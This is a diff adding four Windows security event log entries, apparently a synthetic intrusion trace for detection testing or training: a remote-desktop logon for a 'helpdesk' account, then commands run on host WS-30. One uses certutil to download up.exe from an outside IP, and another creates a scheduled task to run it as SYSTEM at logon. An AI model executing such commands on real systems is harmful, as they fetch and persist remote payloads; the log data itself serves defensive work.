@@ -1,0 +1,4 @@
+{"timestamp": "2026-03-05T22:01:10Z", "host": "WS-30", "EventID": 4624, "TargetUserName": "helpdesk", "LogonType": 10, "IpAddress": "198.51.100.7"}
+{"timestamp": "2026-03-05T22:03:41Z", "host": "WS-30", "EventID": 4688, "SubjectUserName": "helpdesk", "NewProcessName": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/up.exe C:\\Users\\Public\\up.exe"}
+{"timestamp": "2026-03-05T22:04:02Z", "host": "WS-30", "EventID": 4688, "SubjectUserName": "helpdesk", "NewProcessName": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\up.exe /sc onlogon /ru SYSTEM"}
+{"timestamp": "2026-03-05T22:05:15Z", "host": "WS-30", "EventID": 4688, "SubjectUserName": "helpdesk", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -c Get-Process | Out-File C:\\Users\\Public\\p.txt"}
